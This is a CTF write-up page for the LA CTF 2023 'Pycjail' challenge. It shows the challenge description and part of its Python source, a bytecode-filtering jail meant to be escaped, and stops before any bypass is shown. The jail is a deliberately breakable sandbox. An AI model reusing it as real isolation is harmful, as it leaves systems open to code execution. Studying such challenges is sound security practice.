<!DOCTYPE html><html lang="en" class="scroll-smooth"><head><link rel="apple-touch-icon" sizes="76x76" href="/static/favicons/apple-touch-icon.png?v=2"/><link rel="icon" type="image/png" sizes="32x32" href="/static/favicons/favicon-32x32.png?v=2"/><link rel="icon" type="image/png" sizes="16x16" href="/static/favicons/favicon-16x16.png?v=2"/><link rel="manifest" href="/static/favicons/site.webmanifest?v=2"/><link rel="mask-icon" href="/static/favicons/safari-pinned-tab.svg?v=2" color="#5bbad5"/><meta name="msapplication-TileColor" content="#da532c"/><meta name="theme-color" content="#ffffff"/><link rel="alternate" type="application/rss+xml" href="/feed.xml"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/katex.min.css" integrity="sha384-Um5gpz1odJg5Z4HAmzPtgZKdTBHZdw8S29IecapCSB31ligYPhHQZMIlWLYQGVoc" crossorigin="anonymous"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><meta charSet="utf-8"/><script>!function(){try {var d=document.documentElement.classList;d.remove('light','dark');var e=localStorage.getItem('theme');d.add('dark');if("system"===e||(!e&&false)){var t="(prefers-color-scheme: dark)",m=window.matchMedia(t);m.media!==t||m.matches?d.add('dark'):d.add('light')}else if(e) d.add(e)}catch(e){}}()</script><meta content="width=device-width, initial-scale=1" name="viewport"/><title>LA CTF 2023 – Pycjail</title><meta name="robots" content="follow, index"/><meta name="description" content="Use bytecode manipulation to subvert jail restrictions."/><meta property="og:url" content="https://sekai.team/blog/lactf-2023/pycjail/"/><meta property="og:type" content="article"/><meta property="og:site_name" content="Project SEKAI"/><meta property="og:description" content="Use bytecode manipulation to subvert jail restrictions."/><meta property="og:title" content="LA CTF 2023 – Pycjail"/><meta property="og:image" content="https://og-vercel-ruby.vercel.app/api/sekai?title=LA+CTF+2023+%E2%80%93+Pycjail&amp;desc=Use+bytecode+manipulation+to+subvert+jail+restrictions.&amp;authors=Legoclones"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="https://twitter.com/ProjectSEKAIctf"/><meta name="twitter:title" content="LA CTF 2023 – Pycjail"/><meta name="twitter:description" content="Use bytecode manipulation to subvert jail restrictions."/><meta name="twitter:image" content="https://og-vercel-ruby.vercel.app/api/sekai?title=LA+CTF+2023+%E2%80%93+Pycjail&amp;desc=Use+bytecode+manipulation+to+subvert+jail+restrictions.&amp;authors=Legoclones"/><meta property="article:published_time" content="2023-02-12T00:00:00.000Z"/><link rel="canonical" href="https://justinapplegate.me/2023/lactf-pycjail"/><link rel="canonical" href="https://sekai.team/blog/lactf-2023/pycjail/"/><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "Article",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://sekai.team/blog/lactf-2023/pycjail"
  },
  "headline": "LA CTF 2023 – Pycjail",
  "image": [
    {
      "@type": "ImageObject",
      "url": "https://og-vercel-ruby.vercel.app/api/sekai?title=LA+CTF+2023+%E2%80%93+Pycjail&desc=Use+bytecode+manipulation+to+subvert+jail+restrictions.&authors=Legoclones"
    }
  ],
  "datePublished": "2023-02-12T00:00:00.000Z",
  "dateModified": "2023-02-12T00:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "Legoclones"
    }
  ],
  "publisher": {
    "@type": "Organization",
    "name": "Project SEKAI",
    "logo": {
      "@type": "ImageObject",
      "url": "https://sekai.team/static/images/fullLogo.svg"
    }
  },
  "description": "Use bytecode manipulation to subvert jail restrictions."
}</script><meta name="next-head-count" content="21"/><link rel="preload" href="/_next/static/css/206f24680f6266ec.css" as="style"/><link rel="stylesheet" href="/_next/static/css/206f24680f6266ec.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-09a75c9ee2bd415e.js" defer=""></script><script src="/_next/static/chunks/main-b8c3e234d7065a2c.js" defer=""></script><script src="/_next/static/chunks/pages/_app-b8cbc7cb85baf88e.js" defer=""></script><script src="/_next/static/chunks/framework-327e104994690a53.js" defer=""></script><script src="/_next/static/chunks/29107295-a2d0c8e72019a3ed.js" defer=""></script><script src="/_next/static/chunks/545-f1dc6b53ce85b08b.js" defer=""></script><script src="/_next/static/chunks/930-1296a6163e1e3cc6.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5B...slug%5D-9a47024c9df525b8.js" defer=""></script><script src="/_next/static/qjVMIloeGVfOBGlHlZkTe/_buildManifest.js" defer=""></script><script src="/_next/static/qjVMIloeGVfOBGlHlZkTe/_ssgManifest.js" defer=""></script><script src="/_next/static/qjVMIloeGVfOBGlHlZkTe/_middlewareManifest.js" defer=""></script><style data-href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap">@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuLyfMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuGKYMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuFuYMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body class="antialiased text-black bg-white dark:bg-gray-900 dark:text-white"><div id="__next" data-reactroot=""><div class="max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0"><div class="flex flex-col justify-between h-screen"><header class="flex items-center justify-between py-10"><div><a aria-label="Visit home page" href="/"><div class="flex items-center justify-between"><div class="mr-3"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 468.7 215.63" height="80" width="auto"><defs><linearGradient id="fullLogo_svg__linear-gradient" x1="-7051.74" y1="5608.42" x2="-7051.74" y2="5392.1" gradientTransform="matrix(1 0 .15 -.99 6503.98 5547.9)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#00e5ea"></stop><stop offset="1" stop-color="#00b5cc"></stop></linearGradient><linearGradient id="fullLogo_svg__linear-gradient-2" x1="1498.32" y1="4428.84" x2="1497.92" y2="4311.82" gradientTransform="matrix(1 0 0 -1 -1107.01 4435.41)" xlink:href="#fullLogo_svg__linear-gradient"></linearGradient><linearGradient id="fullLogo_svg__linear-gradient-3" x1="320.76" y1="14.17" x2="320.76" y2="47.97" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#0069a5"></stop><stop offset="1" stop-color="#003d6b"></stop></linearGradient><style>.fullLogo_svg__cls-1{fill:#fff}</style></defs><g id="fullLogo_svg__Project_SEKAI_Wide_White" data-name="Project SEKAI Wide White"><path class="fullLogo_svg__cls-1" d="M107 117.14v-4c11.93 0 22.15-8.62 23.76-20l12.91-91.63h4.06l-13 92.14c-1.92 13.4-13.84 23.49-27.73 23.49Z"></path><path class="fullLogo_svg__cls-1" d="M97.43 98.3a16 16 0 0 1-16.26-18.72l8.68-61.42A21.78 21.78 0 0 1 110.77 0a16.34 16.34 0 0 1 12.57 5.5A16.36 16.36 0 0 1 127 18.72l-8.69 61.42c-1.39 10.01-10.77 18.16-20.88 18.16ZM110.77 4a17.63 17.63 0 0 0-17 14.72l-8.64 61.42a12 12 0 0 0 12.3 14.16 17.65 17.65 0 0 0 16.95-14.72l8.69-61.42a12.41 12.41 0 0 0-2.75-10A12.4 12.4 0 0 0 110.77 4ZM186.94 5.42l.56-3.91H162.99l-13.5 95.44H174l.57-4h-20.46l5.85-41.36h20.46l.56-4h-20.45l5.96-42.17h20.45zM266.73 1.51h-31.01l-.55 3.91h14.2l-12.95 91.53h4.06l12.93-91.53h12.77l.55-3.91zM212.61 1.51a15.86 15.86 0 0 0-15.24 13.24l-9.86 69.48a11.69 11.69 0 0 0 2.76 9.34 12.57 12.57 0 0 0 9.18 4.43h.2c6.38 0 11.65-5.57 15.15-9.28L211.9 86c-3.06 3.23-7.67 8.11-12.38 8a8.54 8.54 0 0 1-6.21-3 7.73 7.73 0 0 1-1.84-6.18l9.86-69.48a11.83 11.83 0 0 1 11.28-9.9h13.91l.55-3.91ZM37.08 5.58a12 12 0 0 0-9.26-4.06H13.5L0 97h4.06l6.41-45.37h10.84a15.87 15.87 0 0 0 15.24-13.29l3.25-23a12 12 0 0 0-2.72-9.76Zm-1.24 9.17-3.26 23a11.74 11.74 0 0 1-11.27 9.8H11l6-42.13h10.85a7.94 7.94 0 0 1 8 9.33ZM75.09 5.58a12 12 0 0 0-9.26-4.06h-14.3L38 97h4l6.5-45.42h10L65 96.2h4l-6.6-45a16 16 0 0 0 12.16-12.86l3.25-23a12 12 0 0 0-2.72-9.76Zm-1.24 9.17-3.25 23a11.76 11.76 0 0 1-11.28 9.8H49.07L55 5.42h10.86a7.94 7.94 0 0 1 8 9.33ZM223.75 215.47h-4.06l13.5-95.43h4.05l-13.49 95.43zM65.83 215.63a14.49 14.49 0 0 1-11-4.65 11.3 11.3 0 0 1-2.68-9.15l1.31-8.59 4.4-2.34-1.76 11.52a7.24 7.24 0 0 0 1.75 5.93 10.47 10.47 0 0 0 8 3.28c6.42 0 12.26-4.39 13-9.8l5.42-38.33-28.77 15.27 6.37-46c1-7.3 8.65-13.24 17-13.24a14.52 14.52 0 0 1 11 4.65 11.36 11.36 0 0 1 2.68 9.14l-1.2 8.68-4.35 2.34 1.64-11.6a7.29 7.29 0 0 0-1.74-6 10.5 10.5 0 0 0-8-3.28c-6.42 0-12.26 4.39-13 9.79l-5.29 38.27 28.8-15.28-6.52 46.1c-1.11 7.35-8.73 13.29-17.06 13.29ZM174.15 120.04h-4.51l-26.9 51.72 7.31-51.72H146l-13.5 95.43h4.05l4.5-31.8 10.61-20.4 12.61 52.2h4.11l-13.91-57.6 19.68-37.83zM205 215.47h4l-2.29-94.87v-.56h-4l-29.31 95.43h4.18l9.82-32h16.83Zm-16.37-36L203 132.68l1.13 46.81ZM132.58 123.94l.56-3.91h-24.52l-13.49 95.44h24.51l.56-4H99.75l5.85-41.36h20.45l.57-4h-20.46l5.97-42.17h20.45z"></path><path style="fill:url(#fullLogo_svg__linear-gradient)" d="M279.69 1.51h8.87l-32.09 213.93h-8.87L279.69 1.51z"></path><path d="M393.81 14.88C396 .34 331.4 1.5 296.53 1.5L283.6 87.67c33.36-1.94 99.5-2 97.21 13.27-1.14 7.58-5.53 7.29-6.1 11.08-1.52 10.14 70.94 5.62 81.15 4.52L434 73.6l34.7-43.29c-17.47 1.81-82.47 4.94-81.11-4.15.73-4.87 5.41-5.56 6.22-11.28Z" style="fill:url(#fullLogo_svg__linear-gradient-2)"></path><path d="m324.34 13-5.8 25.24A9.73 9.73 0 0 0 312 36c-4.66 0-8.43 2.82-8.42 6.27s3.8 6.24 8.46 6.22c4 0 7.4-2.12 8.23-4.92 0-.14.06-.28.09-.42l3.48-15.5q9.18 2.06 9.72 5.26a9 9 0 0 1-1.27 6.22 10.78 10.78 0 0 0 5.7-8.81q.48-5.88-13.65-17.32Z" style="fill:url(#fullLogo_svg__linear-gradient-3)"></path></g></svg></div></div></a></div><div class="flex items-center text-base leading-5"><div class="hidden sm:block"><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/members/">Members</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/contests/">Contests</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/blog/">Blog</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/tags/">Tags</a><a target="_blank" rel="noopener noreferrer" href="https://ctf.sekai.team/" class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100">CTF 2023</a></div><div class="sm:hidden"><button type="button" class="w-8 h-8 py-1 ml-1 mr-1 rounded" aria-label="Toggle Menu"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg></button><div class="fixed w-full h-full top-24 right-0 bg-gray-200 dark:bg-gray-800 opacity-95 z-10 transform ease-in-out duration-300 translate-x-full"><button type="button" aria-label="toggle modal" class="fixed w-full h-full cursor-auto focus:outline-none"></button><nav class="fixed h-full mt-8"><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/members/">Members</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/contests/">Contests</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/blog/">Blog</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/tags/">Tags</a></div><div class="px-12 py-4"><a target="_blank" rel="noopener noreferrer" href="https://ctf.sekai.team/" class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100">CTF 2023</a></div></nav></div></div></div></header><main class="mb-auto"><div class="max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0"><article><div class="xl:divide-y xl:divide-gray-200 xl:dark:divide-gray-700"><header class="pt-6 xl:pb-6"><div class="space-y-1 text-center"><dl class="space-y-10"><div><dt class="sr-only">Published on</dt><dd class="text-base font-medium leading-6 text-gray-500 dark:text-gray-400"><time dateTime="2023-02-12T00:00:00.000Z">Sunday, 12 February 2023</time></dd></div></dl><div><h1 class="text-3xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-5xl md:leading-14">LA CTF 2023 – Pycjail</h1></div></div></header><div class="pb-8 divide-y divide-gray-200 xl:divide-y-0 dark:divide-gray-700 xl:grid xl:grid-cols-4 xl:gap-x-6" style="grid-template-rows:auto 1fr"><dl class="pt-6 pb-10 xl:pt-11 xl:border-b xl:border-gray-200 xl:dark:border-gray-700"><dt class="sr-only">Authors</dt><dd><ul class="flex justify-center space-x-8 xl:block sm:space-x-12 xl:space-x-0 xl:space-y-8"><li class="flex items-center space-x-2"><img src="https://www.gravatar.com/avatar/a6122f35bdc157fb5e76ef5f3de833a2?d=identicon&amp;s=256" width="38px" height="38px" alt="avatar" class="w-10 h-10 rounded-full"/><dl class="text-sm font-medium leading-5 whitespace-nowrap"><dt class="sr-only">Name</dt><dd class="text-gray-900 dark:text-gray-100">Legoclones</dd><dt class="sr-only">Twitter</dt><dd><a target="_blank" rel="noopener noreferrer" href="https://twitter.com/legoclones" class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400">@legoclones</a></dd></dl></li></ul></dd></dl><div class="divide-y divide-gray-200 dark:divide-gray-700 xl:pb-0 xl:col-span-3 xl:row-span-2"><div class="pt-10 pb-8 prose dark:prose-dark max-w-none"><h2 id="pycjail-misc-495-points"><a href="#pycjail-misc-495-points" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Pycjail (Misc, 495 Points)</h2>
<blockquote>
<p>All of you think you’re so cute with your fancy little sandbox bypasses, but jokes on you I’ve started filtering the bytecode! I’d like to see you bypass this!</p>
<p>Note: The program is being run in the python:3.10-slim-bullseye Docker image on the server.</p>
<p>Attachment: <a target="_blank" rel="noopener noreferrer" href="https://github.com/Legoclones/website/blob/main/source/static/lactf-pycjail/main.py">main.py</a></p>
</blockquote>
<p>This challenge required you to bypass a Python jail, which limited several aspects of a custom <code>code</code> object you created. The source code:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token comment">#!/usr/local/bin/python3</span>
</span><span class="code-line"><span class="token keyword">import</span> opcode
</span><span class="code-line"><span class="token keyword">import</span> inspect
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token keyword">pass</span>
</span><span class="code-line">
</span><span class="code-line">banned <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&quot;IMPORT_NAME&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;MAKE_FUNCTION&quot;</span><span class="token punctuation">]</span>
</span><span class="code-line"><span class="token keyword">for</span> k <span class="token keyword">in</span> opcode<span class="token punctuation">.</span>opmap<span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>
</span><span class="code-line">        <span class="token punctuation">(</span><span class="token string">&quot;LOAD&quot;</span> <span class="token keyword">in</span> k <span class="token keyword">and</span> k <span class="token operator">!=</span> <span class="token string">&quot;LOAD_CONST&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">        <span class="token keyword">or</span> <span class="token string">&quot;STORE&quot;</span> <span class="token keyword">in</span> k
</span><span class="code-line">        <span class="token keyword">or</span> <span class="token string">&quot;DELETE&quot;</span> <span class="token keyword">in</span> k
</span><span class="code-line">        <span class="token keyword">or</span> <span class="token string">&quot;JUMP&quot;</span> <span class="token keyword">in</span> k
</span><span class="code-line">    <span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        banned<span class="token punctuation">.</span>append<span class="token punctuation">(</span>k<span class="token punctuation">)</span>
</span><span class="code-line">banned <span class="token operator">=</span> <span class="token punctuation">{</span>opcode<span class="token punctuation">.</span>opmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> banned<span class="token punctuation">}</span>
</span><span class="code-line">
</span><span class="code-line">consts <span class="token operator">=</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;consts: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;,&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">names <span class="token operator">=</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;names: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;,&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">code <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;code: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>consts<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;too many consts &gt;:(&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>names<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">4</span><span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;too many names &gt;:(&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">30</span><span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;too much code &gt;:(&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;invalid code &gt;:(&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">elif</span> <span class="token builtin">any</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">in</span> banned <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;banned opcode &gt;:(&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">elif</span> <span class="token builtin">any</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">3</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
